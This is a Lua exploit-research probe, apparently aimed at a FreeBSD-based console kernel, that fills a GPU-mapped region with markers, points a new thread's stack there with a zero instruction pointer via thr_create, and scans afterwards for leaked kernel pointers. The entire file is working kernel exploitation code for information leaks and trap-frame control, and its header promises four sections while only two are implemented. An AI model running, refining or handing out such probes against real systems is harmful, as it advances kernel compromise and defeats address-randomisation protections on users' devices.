-- CRASH_CLASS: RISKY
-- PROBE 78c: Controlled RSP pointing into GPU mmap — trap frame exploitation
--
-- Context: When the child thread faults at RIP=0, the kernel reads RSP from
-- the thread's trap frame. If RSP points into our GPU mmap region (which we
-- control), the kernel may:
--   1. Write signal frame data to our "stack" (leaking kernel addresses)
--   2. Read return addresses from our fake stack during unwinding
--   3. Follow our controlled pointers during cleanup
--
-- Strategy:
--   Section A: RSP -> GPU mmap filled with 0x41414141 pattern, RIP=0
--   Section B: RSP -> GPU mmap filled with candidate kernel return addresses, RIP=0
--   Section C: RSP -> GPU mmap, check if kernel WRITES to it (signal frame leak)
--   Section D: Control experiment — RSP -> heap (non-GPU), RIP=0

print("=== PROBE 78c: CONTROLLED RSP TRAP FRAME ===")
print("")

local TEST_SECTION = 1

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

print("TEST_SECTION=" .. TEST_SECTION)

local sc_getpid = make_syscall(20)
local sc_nanosleep = make_syscall(240)
local sc_thr_create = make_syscall(430)
local sc_mmap = make_syscall(477)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid) .. " ok=" .. tostring(alive_ok))

-- Allocate GPU mmap region for fake stack
local GPU_PAGES = 16
local gpu_size = GPU_PAGES * 0x4000
local mok, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(gpu_size), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("[0] gpu_mmap ok=" .. tostring(mok) .. " addr=" .. q(gpu))

if not mok or not gpu then
    print("[!] GPU mmap failed, aborting")
    print("=== PROBE 78c ABORTED ===")
    return
end

-- Use the MIDDLE of the GPU region as RSP so there's room in both directions
local gpu_mid = gpu + (gpu_size / 2)
-- Align to 16 bytes (x86-64 ABI)
local fake_rsp = gpu_mid

print("[0] fake_rsp=" .. q(fake_rsp))

-- Context and id
local ctx = memory.alloc(0x600)
local id_slot = memory.alloc(0x10)
zero(ctx, 0x600)
zero(id_slot, 0x10)

-- Context gates
wq(ctx + 0x108, 0x480)
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, 0x10000)

-- Common: RIP=0 (fault), RFLAGS=0
wq(ctx + 0xF8, 0)
wq(ctx + 0x100, 0)

-- Sentinel in id_slot
wq(id_slot, uint64(string.format("0x%X%08X", 0xDEADBEEF, 0xDEADBEEF)))

-- ==============================
-- SECTION A: Fill GPU with pattern, RSP -> GPU, RIP=0
-- ==============================
if TEST_SECTION == 1 then
    print("=== SECTION A: GPU filled with 0x41414141, RSP->GPU ===")

    -- Fill GPU region with recognizable pattern
    for off = 0, gpu_size - 4, 4 do
        wd(gpu + off, 0x41414141)
    end
    -- Put unique markers at the RSP location
    for off = -0x100, 0x100, 8 do
        wq(fake_rsp + off, uint64(string.format("0x%X%08X", 0xCAFE0000 + (off / 8), 0xBEEF0000 + off)))
    end

    wq(ctx + 0xE0, fake_rsp)  -- RSP -> GPU
    wq(ctx + 0x48, uint64(0xAAAA0001))  -- RDI marker
    wq(ctx + 0x50, uint64(0xBBBB0001))  -- RSI marker

    -- Snapshot the GPU region around RSP BEFORE thr_create
    print("[A] === PRE-CREATE GPU SNAPSHOT (RSP +/- 0x80) ===")
    for off = -0x80, 0x80, 8 do
        local val = rq(fake_rsp + off)
        if val then
            print(string.format("[A] RSP%+04d: %s", off, q(val)))
        end
    end
    print("[A] === END PRE SNAPSHOT ===")

    print("[A] [BEFORE] thr_create")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[A] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    local tid = rq(id_slot)
    print("[A] tid=" .. q(tid))

    -- Immediate canary
    local c_ok, c_pid = canary()
    print("[A] canary_immediate ok=" .. tostring(c_ok) .. " pid=" .. tostring(c_pid))

    -- Wait 200ms for kernel to process the fault
    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 200000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    -- Snapshot AFTER — did the kernel write anything to our fake stack?
    print("[A] === POST-CREATE GPU SNAPSHOT (RSP +/- 0x80) ===")
    local changed = 0
    for off = -0x80, 0x80, 8 do
        local val = rq(fake_rsp + off)
        if val then
            local h, l = get_hi_lo(val)
            local pre_h = 0xCAFE0000 + (off / 8)
            local pre_l = 0xBEEF0000 + off
            local is_changed = (h ~= pre_h) or (l ~= pre_l)
            local tag = ""
            if is_changed then
                tag = " <== CHANGED!"
                changed = changed + 1
            end
            if h >= 0xFFFF8000 then
                tag = tag .. " KERNEL_PTR!"
            end
            print(string.format("[A] RSP%+04d: %s%s", off, q(val), tag))
        end
    end
    print("[A] === END POST SNAPSHOT ===")
    print("[A] changed_qwords=" .. changed)

    -- Broader scan for kernel pointers anywhere in GPU region
    print("[A] === FULL GPU KERNEL POINTER SCAN ===")
    local kptrs = 0
    for off = 0, gpu_size - 8, 8 do
        local val = rq(gpu + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                print(string.format("[A] GPU+0x%06X: %s KERNEL_PTR!", off, q(val)))
                kptrs = kptrs + 1
                if kptrs >= 20 then
                    print("[A] (truncated at 20)")
                    break
                end
            end
        end
    end
    print("[A] kernel_pointers_found=" .. kptrs)
    print("[A] === END SCAN ===")

    -- Canaries
    local c2_ok, c2_pid = canary()
    print("[A] canary_200ms ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    wq(ts, 2); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c3_ok, c3_pid = canary()
    print("[A] canary_2200ms ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

    wq(ts, 5)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c4_ok, c4_pid = canary()
    print("[A] canary_7200ms ok=" .. tostring(c4_ok) .. " pid=" .. tostring(c4_pid))

    print("=== SECTION A COMPLETE ===")

-- ==============================
-- SECTION C: Check if kernel writes signal frame to our GPU stack
-- ==============================
elseif TEST_SECTION == 2 then
    print("=== SECTION C: Zero-filled GPU, check for kernel writes ===")

    -- Zero the entire GPU region
    for off = 0, gpu_size - 4, 4 do
        wd(gpu + off, 0)
    end

    wq(ctx + 0xE0, fake_rsp)
    wq(ctx + 0x48, uint64(0xAAAA0002))
    wq(ctx + 0x50, uint64(0xBBBB0002))

    print("[C] [BEFORE] thr_create (GPU zeroed)")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[C] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))
    print("[C] tid=" .. q(rq(id_slot)))

    local c_ok, c_pid = canary()
    print("[C] canary_immediate ok=" .. tostring(c_ok) .. " pid=" .. tostring(c_pid))

    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 200000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    -- Scan for ANY non-zero writes to the GPU region
    print("[C] === POST-CREATE NON-ZERO SCAN ===")
    local writes = 0
    for off = 0, gpu_size - 8, 8 do
        local val = rq(gpu + off)
        if val then
            local h, l = get_hi_lo(val)
            if h ~= 0 or l ~= 0 then
                local tag = ""
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then tag = " KERNEL_PTR!" end
                print(string.format("[C] GPU+0x%06X: %s%s", off, q(val), tag))
                writes = writes + 1
                if writes >= 50 then
                    print("[C] (truncated at 50)")
                    break
                end
            end
        end
    end
    print("[C] non_zero_writes=" .. writes)
    print("[C] === END SCAN ===")

    wq(ts, 5); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c2_ok, c2_pid = canary()
    print("[C] canary_5s ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    print("=== SECTION C COMPLETE ===")

else
    print("[!] invalid TEST_SECTION=" .. TEST_SECTION .. " (use 1-2)")
    print("=== PROBE 78c ABORTED ===")
    return
end

print("")
print("=== PROBE 78c SECTION " .. TEST_SECTION .. " COMPLETE ===")
print("Key results: check CHANGED and KERNEL_PTR markers above.")
print("=== PROBE 78c COMPLETE ===")
